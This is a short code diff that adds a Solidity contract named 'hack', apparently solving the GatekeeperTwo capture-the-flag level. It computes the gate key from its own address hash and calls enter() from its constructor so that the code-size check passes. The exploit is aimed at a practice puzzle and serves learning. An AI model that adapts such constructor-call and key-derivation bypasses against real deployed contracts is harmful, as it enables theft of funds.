@@ -27,3 +27,16 @@ contract GatekeeperTwo {
     return true;
   }
 }
+
+contract hack {
+
+    address levelInstance;
+
+    constructor(address _levelInstance) {
+      levelInstance = _levelInstance;
+      unchecked {
+      bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1  );
+      GatekeeperTwo(levelInstance).enter(key);
+      }
+    }
+}
